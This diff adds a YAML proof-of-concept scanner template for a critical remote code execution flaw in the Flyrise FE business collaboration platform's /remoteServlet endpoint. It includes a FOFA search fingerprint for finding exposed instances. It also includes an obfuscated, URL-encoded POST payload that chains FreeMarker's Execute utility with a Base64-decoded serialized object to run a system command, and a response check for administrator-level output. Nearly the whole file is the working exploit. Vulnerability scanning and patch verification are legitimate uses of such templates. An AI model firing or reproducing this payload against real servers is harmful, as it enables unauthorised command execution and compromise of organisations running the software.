@@ -1,0 +1,29 @@
+id: poc-yaml-flyrise-enterprise-remoteServlet-rce
+info:
+  name: 飞企互联FE业务协作平台 remoteServlet 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: FE业务协作平台
+  fofa: body="flyrise.stopBackspace.js"
+requests:
+- method: POST
+  path: /remoteServlet
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: obj=weChatService&method=loginService&onBeforeServerEvent=%66%72%0a%65%65%0a%6d%61%72%0a%6b%0a%65%72%2e%74%65%6d%70%6c%61%74%0a%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%0a%75%74%65%2e%65%0a%78%65%63(%6f%0a%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%0a%2e%6c%61%0a%6e%67%2e%0a%53%65%72%69%61%6c%69%7a%61%74%69%0a%6f%6e%55%0a%74%69%6c%73%2e%64%65%0a%73%0a%65%72%69%61%6c%0a%69%7a%65(%6a%63%69%66%73%2e%75%74%69%6c%2e%42%61%73%65%36%34%0a%2e%64%65%63%6f%64%0a%65(%72%4f%30%41%42%58%4e%79%41%0a%42%4e%71%59%0a%58%5a%68%4c%6e%56%30%61%57%77%75%51%58%4a%79%59%58%6c%4d%61%58%4e%30%65%49%48%53%48%5a%6e%48%59%5a%30%44%41%41%46%4a%41%41%52%7a%61%58%70%6c%65%48%41%41%41%41%41%42%64%77%51%41%41%41%41%42%64%41%41%52%59%32%31%6b%4c%6d%56%34%5a%53%41%76%59%79%42%33%61%47%39%68%62%57%6c%34)))&returnEventData=true&count=2&param1=1&param2=MQ==
+  expression: 'status_code == 200 &&
+
+    contains(body,"beforeData") &&
+
+    contains(body,"\\administrator") &&
+
+    contains(body,"\"errorCode\":\"-2\"") &&
+
+    contains(body,"\"afterData\" : null") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
